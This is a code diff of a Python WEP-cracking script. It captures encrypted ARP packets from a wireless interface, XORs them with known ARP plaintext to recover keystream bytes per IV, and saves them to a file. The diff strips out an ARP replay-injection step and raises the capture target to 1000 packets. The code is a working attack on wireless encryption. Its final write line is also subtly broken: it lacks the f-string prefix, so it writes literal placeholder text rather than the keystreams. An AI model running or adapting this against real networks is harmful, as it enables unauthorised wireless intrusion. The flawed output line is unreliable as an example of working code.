@@ -10,15 +10,8 @@ from argparse import ArgumentParser as AP
 ARP_REQUEST_PATTERN = 'aaaa0300000008060001080006040001'
 ARP_RESPONSE_PATTERN = 'aaaa0300000008060001080006040002'
 keystreams = {}
-re_injection_packet = None
 arp_packets_captured = 0
 iface = 'wlan0'
-
-# Don't think we want this cause then we can't keep track of how many packets we have
-# t = AsyncSniffer()
-# t.start()
-# print("hey")
-# results = t.stop()
 
 
 def expand(x):
@@ -29,14 +22,14 @@ def expand(x):
 
 
 def arp_monitor_callback(pkt):
-    global re_injection_packet
     global arp_packets_captured
     global iface
     if len(pkt) == 112 or len(pkt) == 110:
         # print(pkt[RadioTap].len)
         layers = list(expand(pkt))
         if '802.11 WEP packet' in layers:
-            arp_packets_captured += 1
+            if arp_packets_captured % 50 == 0:
+                print(arp_packets_captured)
             src_address = pkt.addr2
             bssid = pkt.addr1
             iv_bytes = binascii.hexlify(pkt.iv)
@@ -47,28 +40,23 @@ def arp_monitor_callback(pkt):
 
             # ARP request
             if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
-                if re_injection_packet is None:
-                    re_injection_packet = pkt
                 xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
+                    arp_packets_captured += 1
                     keystreams[iv_hexstring] = keystream_first_bytes
-                # TODO Does not need to be on a new thread, but could potentially speed things up
-                if re_injection_packet is not None:
-                    sendp(re_injection_packet, iface=iface, count=3, inter=0.100)
             # ARP response
             else:
                 xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
+                    arp_packets_captured += 1
                     keystreams[iv_hexstring] = keystream_first_bytes
-                if re_injection_packet is not None:
-                    sendp(re_injection_packet, iface=iface, count=3, inter=0.100)
 
 
 def stop_condition(pkt):
     global arp_packets_captured
-    if arp_packets_captured > 5: return True
+    if arp_packets_captured > 1000: return True
 
 
 if __name__ == "__main__":
@@ -86,5 +74,8 @@ if __name__ == "__main__":
     # for packet in scapy_cap:
     #     arp_monitor_callback(packet)
 
-    for key in keystreams:
-        print(f'{key} - {keystreams[key]}')
+    with open('keystreams.txt', 'w') as f:
+        print(len(keystreams))
+        for key, value in keystreams.items():
+            # print(f'{key} - {value}')
+            f.write('{key}:{value}')
